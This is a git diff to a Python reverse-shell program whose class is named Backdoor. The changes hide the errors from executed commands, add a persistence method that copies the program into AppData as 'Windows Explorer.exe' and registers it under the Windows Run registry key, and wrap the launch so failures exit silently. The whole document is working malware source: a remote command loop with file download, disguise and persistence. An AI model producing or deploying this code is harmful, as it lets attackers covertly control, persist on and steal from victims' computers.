@@ -3,6 +3,8 @@ import subprocess
 import json
 import os
 import base64
+import sys
+import shutil
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -10,9 +12,21 @@ class Backdoor:
         self.sock_obj.connect((ip, port))
     def exec_system_cmd(self, command):
         try:
-            return subprocess.check_output(command, shell=True)
+            DEVNULL = open(os.devnull,'wb')
+            return subprocess.check_output(command, 
+                                           shell=True,
+                                           stderr=DEVNULL,
+                                           stdin=DEVNULL)
         except:
             return "[+] ERROR - Error during command execution"
+        
+
+    def persistence(self):
+        location = os.environ["appdata"]+"\\Windows Explorer.exe"
+        shutil.copyfile(sys.executable, location)
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t /REG_SZ /d "'+location+'"',shell=True)
+
+
     def reliable_send(self, data):
         if not isinstance(data, str):
             data = data.decode('utf-8')
@@ -50,7 +64,7 @@ class Backdoor:
             recv_data = self.reliable_receive()
             if recv_data[0] == "exit":
                 self.sock_obj.close()
-                exit()
+                sys.exit() # reliable exit -> prevents error message from being displayed
             elif recv_data[0] == "cd" and len(recv_data)>1:
                 res = self.change_working_directory_to(recv_data[1])
             elif recv_data[0] == "download":
@@ -61,5 +75,8 @@ class Backdoor:
                 res = self.exec_system_cmd(recv_data)
             self.reliable_send(res)
 
-backdoor = Backdoor("127.0.0.1",4444)
-backdoor.run()
+try:
+    backdoor = Backdoor("127.0.0.1",4444)
+    backdoor.run()
+except:
+    sys.exit()
